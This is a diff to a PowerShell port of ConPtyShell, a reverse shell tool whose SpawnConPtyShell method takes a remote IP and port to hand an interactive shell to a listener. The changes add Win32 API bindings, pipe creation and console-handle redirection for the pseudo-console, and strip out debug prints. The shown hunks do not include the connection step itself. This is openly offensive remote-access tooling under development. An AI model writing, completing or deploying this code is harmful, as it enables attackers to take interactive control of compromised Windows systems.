@@ -794,9 +794,12 @@ $global:SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
 }
 
 $FunctionDefinitions = @(
-    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
+    (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
+    (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
+    (func kernel32 CreatePipe ([bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
+    (func kernel32 CreateFile ([IntPtr]) @([String], [UInt32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr])),
     (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
-    (func kernel32 CreatePipe ([bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError)
+    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError)
 )
 
 $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
@@ -813,28 +816,54 @@ class ConPtyShellException : System.Exception {
 
 
 class ConPtyShell {
-    hidden [int] $BUFFER_SIZE_PIPE = 0x100000
+    hidden static [int]   $BUFFER_SIZE_PIPE  = 0x100000
+    hidden static [UInt32] $GENERIC_READ = 2147483648
+    hidden static [UInt32] $GENERIC_WRITE    = 0x40000000
+    hidden static [UInt32] $FILE_SHARE_READ  = 0x00000001
+    hidden static [UInt32] $FILE_SHARE_WRITE = 0x00000002
+    hidden static [UInt32] $FILE_ATTRIBUTE_NORMAL = 0x80
+    hidden static [UInt32] $OPEN_EXISTING = 3
+
+    hidden static [Int32] $STD_INPUT_HANDLE  = -10;
+    hidden static [Int32] $STD_OUTPUT_HANDLE = -11;
+    hidden static [Int32] $STD_ERROR_HANDLE  = -12;
 
     <# Define the class. Try constructors, properties, or methods. #>
     $ProccessInformation = $global:ProccessInformation
 
-    hidden static [void] CreatePipes([IntPtr] $InputPipeRead, [IntPtr] $InputPipeWrite, [IntPtr] $OutputPipeRead, [IntPtr] $OutputPipeWrite) {
-
+    hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
         $Kernel32 = $global:Kernel32
 
         $pSec = New-Object -TypeName "SECURITY_ATTRIBUTES"
         $pSec.nLength = $global:SECURITY_ATTRIBUTES_TYPE::GetSize()
         $pSec.bInheritHandle = 1
         $pSec.lpSecurityDescriptor = [IntPtr]::Zero
+        
+        if (! $Kernel32::CreatePipe($InputPipeRead, $InputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
+            throw [ConPtyShellException] "Could not create the InputPipe"
+        }
 
-        $res = $Kernel32::CreatePipe([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)
-
-        Write-Host "plop 2"
-        Write-Host "res: $res"
-
-        $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        throw (New-Object ComponentModel.Win32Exception($lastError))
+        if (! $Kernel32::CreatePipe($OutputPipeRead, $OutputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
+            throw [ConPtyShellException] "Could not create the OutputPipe"
+        }
+        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
     }
+
+    hidden static [void] InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr) {
+        $Kernel32 = $global:Kernel32
+
+        $oldStdIn.Value  = $Kernel32::GetStdHandle([ConPtyShell]::STD_INPUT_HANDLE);
+        $oldStdOut.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE);
+        $oldStdErr.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_ERROR_HANDLE);
+
+        $hStdout = $kernel32::CreateFile("CONOUT$", [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);
+        $hStdin =  $kernel32::CreateFile("CONIN$",  [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);
+
+        $Kernel32::SetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE, $hStdout);
+        $Kernel32::SetStdHandle([ConPtyShell]::STD_ERROR_HANDLE, $hStdout);
+        $Kernel32::SetStdHandle([ConPtyShell]::STD_INPUT_HANDLE, $hStdin);
+    }
+
 
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
 
@@ -844,7 +873,7 @@ class ConPtyShell {
         [IntPtr] $OutputPipeRead = [IntPtr]::Zero
         [IntPtr] $OutputPipeWrite = [IntPtr]::Zero
         [IntPtr] $handlePseudoConsole = [IntPtr]::Zero
-        [IntPtr] $oldStdIn = [IntPtr]::Zero
+        [IntPtr] $oldStdIn  = [IntPtr]::Zero
         [IntPtr] $oldStdOut = [IntPtr]::Zero
         [IntPtr] $oldStdErr = [IntPtr]::Zero
         [bool] $newConsoleAllocated = $false
@@ -866,13 +895,13 @@ class ConPtyShell {
             $conptyCompatible = $true
         }
 
+        [ConPtyShell]::CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite)
 
-        [ConPtyShell]::CreatePipes($InputPipeRead, $InputPipeWrite, $OutputPipeRead, $OutputPipeWrite)
+        # comment the below function to debug errors
+        [ConPtyShell]::InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr)
 
-        # $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        # Write-Host "[GetProcAddress]: Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
-
-        Write-Host "ConPtyCompatble: $conptyCompatible"
+        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Host "Err msg: " $LastError.Message
 
         Write-Host "remoteIP: $remoteIp, remotePort: $remotePort, rows: $rows, cols: $cols, cmdLine $commandLine, upShell $upgradeShell"
 
